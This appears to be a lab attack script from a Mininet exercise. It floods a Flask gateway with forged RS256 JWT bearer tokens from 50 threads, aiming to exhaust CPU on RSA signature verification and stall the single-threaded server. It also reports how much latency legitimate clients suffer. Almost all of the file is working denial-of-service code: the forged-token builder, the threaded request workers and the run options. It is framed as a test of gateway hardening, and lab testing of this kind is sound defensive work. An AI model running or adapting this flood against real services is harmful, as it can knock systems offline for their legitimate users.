"""
token_exhaustion_attack.py
----------------------------
Simulates an RSA token-exhaustion / signature-verification-flood attack
against gateway.py. Run this from an attacker host in Mininet once the
gateway is in RSA lockdown mode (i.e. after a network-layer attack has
already been detected and /tmp/lockdown.txt is armed -- or just force
lockdown for testing by touching that file on the gateway host).

Unlike a SYN/UDP flood, every request here completes a full, legitimate
TCP handshake and carries a real HTTP request -- there is nothing
volumetric or spoofed-looking about it at the packet layer. The attack
surface is CPU cost (RSA verification) and, worse, gateway.py's
single-threaded Flask dev server (threaded=False), which processes one
request at a time regardless of how many connections pile up.

Two token strategies, pick with --mode:
  garbage   - completely malformed strings (not even valid JWT structure)
              -> should be cheap to reject IF the gateway pre-validates
                 format before calling jwt.decode(). Tests that hardening.
  malformed_valid_shape - correctly-shaped (3 base64url segments) but
              signed with a throwaway key / wrong algorithm -> this is
              the expensive case: jwt.decode() has to actually run the
              RSA verification math before it can reject it.
"""

import argparse
import base64
import json
import threading
import time
import requests

def make_malformed_shaped_token():
    """A token that LOOKS like a real RS256 JWT (three dot-separated
    base64url segments) but is signed with a throwaway key, so the
    gateway's public key can never verify it. Forces a real RSA-verify
    attempt per request instead of failing on cheap format checks."""
    header = base64.urlsafe_b64encode(json.dumps({"alg": "RS256", "typ": "JWT"}).encode()).rstrip(b"=")
    payload = base64.urlsafe_b64encode(json.dumps({"user": "attacker", "exp": time.time() + 60}).encode()).rstrip(b"=")
    fake_sig = base64.urlsafe_b64encode(b"not a real signature, just 256 bytes of junk" * 6).rstrip(b"=")
    return b".".join([header, payload, fake_sig]).decode()


def worker(target_url, mode, duration, stats, stop_event):
    end_time = time.time() + duration
    sess = requests.Session()
    while time.time() < end_time and not stop_event.is_set():
        if mode == "garbage":
            token = "not-even-a-jwt-just-garbage-bytes"
        else:
            token = make_malformed_shaped_token()
        try:
            t0 = time.time()
            r = sess.get(target_url, headers={"Authorization": f"Bearer {token}"}, timeout=5)
            latency = time.time() - t0
            stats["sent"] += 1
            stats["latencies"].append(latency)
            if r.status_code == 401:
                stats["rejected"] += 1
        except Exception:
            stats["errors"] += 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://10.0.0.1:5000/service")
    ap.add_argument("--threads", type=int, default=50, help="concurrent attacker threads")
    ap.add_argument("--duration", type=float, default=15.0, help="seconds")
    ap.add_argument("--mode", choices=["garbage", "malformed_valid_shape"], default="malformed_valid_shape")
    args = ap.parse_args()

    stats = {"sent": 0, "rejected": 0, "errors": 0, "latencies": []}
    stop_event = threading.Event()

    print(f"[*] Launching {args.threads} threads against {args.target} for {args.duration}s "
          f"(mode={args.mode})")
    threads = [threading.Thread(target=worker, args=(args.target, args.mode, args.duration, stats, stop_event))
               for _ in range(args.threads)]
    t0 = time.time()
    for t in threads: t.start()
    for t in threads: t.join()
    elapsed = time.time() - t0

    lat = stats["latencies"]
    print(f"\n[*] Done in {elapsed:.1f}s")
    print(f"    Requests sent:     {stats['sent']}")
    print(f"    Rejected (401):    {stats['rejected']}")
    print(f"    Errors/timeouts:   {stats['errors']}")
    print(f"    Requests/sec:      {stats['sent']/elapsed:.1f}")
    if lat:
        lat.sort()
        print(f"    Latency p50/p95/p99 (s): {lat[len(lat)//2]:.3f} / "
              f"{lat[int(len(lat)*0.95)]:.3f} / {lat[int(len(lat)*0.99)]:.3f}")
        print(f"    Latency max (s):   {max(lat):.3f}")
    print("\n    A legitimate client's request latency during this window is the real")
    print("    damage metric -- run client.py concurrently from another host and watch")
    print("    its response time balloon even though every one of its own requests")
    print("    is perfectly valid and never gets network-layer blocked.")


if __name__ == "__main__":
    main()
